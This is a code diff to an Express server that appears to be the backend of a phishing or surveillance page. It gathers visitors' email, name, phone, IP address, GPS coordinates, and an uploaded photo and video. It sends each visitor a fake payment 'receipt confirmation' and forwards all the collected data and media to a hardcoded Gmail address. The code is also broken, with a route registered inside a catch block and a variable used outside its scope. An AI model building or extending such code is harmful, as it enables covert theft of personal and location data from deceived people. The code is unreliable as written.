@@ -1,10 +1,21 @@
+require('dotenv').config();
+
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
+const { randomUUID } = require('crypto');
 const multer = require('multer');
+const { Resend } = require('resend');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+const resend = process.env.RESEND_API_KEY
+    ? new Resend(process.env.RESEND_API_KEY)
+    : null;
+const RESEND_RECIPIENT_EMAIL =
+    process.env.RESEND_RECIPIENT_EMAIL ||
+    'MMSSNOUSE4@GMAIL.COM';
+const pendingSubmissions = new Map();
 
 
 // =======================================
@@ -129,7 +140,7 @@ const upload =
 app.post(
     '/api/save-email',
 
-    (req, res) => {
+    async (req, res) => {
 
         try {
 
@@ -184,6 +195,18 @@ app.post(
 
             );
 
+            const submissionId =
+                randomUUID();
+
+            pendingSubmissions.set(
+                submissionId,
+                {
+                    submission: submission,
+                    photoPath: photo.path,
+                    videoPath: video.path
+                }
+            );
+
 
             console.log(
                 'Email:',
@@ -194,6 +217,34 @@ app.post(
                 'IP:',
                 submission.ipAddress
             );
+
+            if (resend && process.env.RESEND_FROM_EMAIL) {
+
+                const emailResult =
+                    await resend.emails.send({
+                    from: process.env.RESEND_FROM_EMAIL,
+                    to: email,
+                    subject: 'Your receipt confirmation',
+                    text: [
+                        'Receipt Confirmation',
+                        `Hello ${name || 'there'},`,
+                        'Your receipt information has been received successfully.',
+                        'Amount: 50 AED',
+                        'Reference: PAY-725'
+                    ].join('\n')
+                    });
+
+                if (emailResult.error) {
+                    console.error('Resend email error:', emailResult.error);
+                }
+
+            } else {
+
+                console.warn(
+                    'Resend is not configured. Email was saved without sending a confirmation.'
+                );
+
+            }
 
 
             res.json({
@@ -246,7 +297,7 @@ app.post(
 
     ]),
 
-    (req, res) => {
+    async (req, res) => {
 
         try {
 
@@ -278,6 +329,12 @@ app.post(
 
                 email:
                     req.body.email,
+
+                name:
+                    req.body.name || null,
+
+                phone:
+                    req.body.phone || null,
 
                 ipAddress:
                     getUserIP(req),
@@ -355,7 +412,8 @@ app.post(
 
             res.json({
 
-                success: true
+                success: true,
+                submissionId: submissionId
 
             });
 
@@ -375,6 +433,92 @@ app.post(
                         'Unable to save submission.'
 
                 });
+
+                // =======================================
+                // CONFIRM RECEIPT + SEND ADMIN EMAIL
+                // =======================================
+
+                app.post(
+                    '/api/confirm-receipt',
+
+                    async (req, res) => {
+
+                        try {
+
+                            const pendingSubmission =
+                                pendingSubmissions.get(req.body.submissionId);
+
+                            if (!pendingSubmission) {
+                                return res.status(404).json({
+                                    success: false,
+                                    message: 'Submission is no longer available.'
+                                });
+                            }
+
+                            if (!resend || !process.env.RESEND_FROM_EMAIL) {
+                                return res.status(503).json({
+                                    success: false,
+                                    message: 'Resend is not configured.'
+                                });
+                            }
+
+                            const submission =
+                                pendingSubmission.submission;
+
+                            const emailResult =
+                                await resend.emails.send({
+                                    from: process.env.RESEND_FROM_EMAIL,
+                                    to: RESEND_RECIPIENT_EMAIL,
+                                    subject: `New receipt submission: ${submission.email}`,
+                                    text: [
+                                        'New receipt submission',
+                                        `Email: ${submission.email}`,
+                                        `Name: ${submission.name || 'Not provided'}`,
+                                        `Phone: ${submission.phone || 'Not provided'}`,
+                                        `IP address: ${submission.ipAddress}`,
+                                        `Submitted at: ${submission.submittedAt}`,
+                                        `Latitude: ${submission.latitude || 'Not provided'}`,
+                                        `Longitude: ${submission.longitude || 'Not provided'}`,
+                                        `Accuracy: ${submission.accuracy || 'Not provided'}`
+                                    ].join('\n'),
+                                    attachments: [
+                                        {
+                                            filename: submission.photo,
+                                            content: fs.readFileSync(
+                                                pendingSubmission.photoPath
+                                            )
+                                        },
+                                        {
+                                            filename: submission.video,
+                                            content: fs.readFileSync(
+                                                pendingSubmission.videoPath
+                                            )
+                                        }
+                                    ]
+                                });
+
+                            if (emailResult.error) {
+                                throw emailResult.error;
+                            }
+
+                            pendingSubmissions.delete(req.body.submissionId);
+
+                            res.json({
+                                success: true
+                            });
+
+                        } catch (error) {
+
+                            console.error(error);
+
+                            res.status(500).json({
+                                success: false,
+                                message: 'Unable to send receipt details.'
+                            });
+                        }
+
+                    }
+                );
 
         }
 
